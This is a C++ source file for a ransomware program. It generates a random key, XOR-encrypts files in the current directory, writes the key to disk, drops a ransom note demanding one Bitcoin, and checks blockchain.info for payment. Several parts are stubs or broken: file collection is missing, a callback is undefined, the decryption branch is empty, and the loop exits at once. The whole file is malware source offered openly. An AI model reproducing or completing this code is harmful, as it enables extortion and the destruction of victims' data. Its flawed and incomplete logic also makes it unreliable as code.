#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <chrono>
#include <ctime>
#include <random>
#include <sstream>
#include <curl/curl.h>

const std::string KEY_FILE_NAME = "key.bin";
const std::string ENCRYPTED_KEY_FILE_NAME = "encrypted_key.bin";
const std::string RANSOM_NOTE_FILE_NAME = "READ_ME.txt";
const int KEY_SIZE = 256;

using namespace std;

std::vector<char> generate_key(int key_size) {
  std::vector<char> key;
  std::mt19937 rng(std::chrono::system_clock::now().time_since_epoch().count());
  std::uniform_int_distribution<int> distribution(0, 255);
  for (int i = 0; i < key_size; i++) {
    key.push_back((char)distribution(rng));
  }
  return key;
}

void encrypt_file(const std::string &file_name, const std::vector<char> &key) {
  std::ifstream in(file_name, std::ios::binary);
  std::ofstream out(file_name + ".encrypted", std::ios::binary);
  int i = 0;
  char c;
  while (in.get(c)) {
    out.put(c ^ key[i % KEY_SIZE]);
    i++;
  }
}

void encrypt_files(const std::vector<char> &key) {
  std::vector<std::string> file_names;
  // get all files in current directory
  // add code here to gather all file names in the current directory

  for (const std::string &file_name : file_names) {
    encrypt_file(file_name, key);
  }
}

void write_key_file(const std::vector<char> &key) {
  std::ofstream out(KEY_FILE_NAME, std::ios::binary);
  out.write(key.data(), key.size());
}

void encrypt_and_write_key(const std::vector<char> &key) {
  std::ofstream out(ENCRYPTED_KEY_FILE_NAME, std::ios::binary);
  int i = 0;
  for (char c : key) {
    out.put(c ^ 0xff);
    i++;
  }
}

void write_ransom_note() {
  std::ofstream out(RANSOM_NOTE_FILE_NAME);
  out << "Your files have been encrypted!\n";
  out << "Pay 1 Bitcoin to the following address to receive the decryption key:\n";
  // add code here to specify the Bitcoin address
}

string getTransactionStatus(string txid) {
  // Use cURL to make an API request to a blockchain explorer
  CURL *curl;
  CURLcode res;
  string response;

  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, ("https://blockchain.info/tx/" + txid).c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
  }

  // Parse the response and extract the transaction status
  string status = "unknown";
  // ...

  return status;
}

int main() {
  std::vector<char> key = generate_key(KEY_SIZE);
  encrypt_files(key);
  write_key_file(key);
  encrypt_and_write_key(key);
  write_ransom_note();
  
  string txid = "..."; // Replace with the transaction ID
  string status = getTransactionStatus(txid);
  
  while(true)
  {

  if(status == "confirmed") {
    // Decrypt the files
  } else {
    cout << "Payment not detected" << endl;
  }

  return 0;
  }
  
  return 0;
}
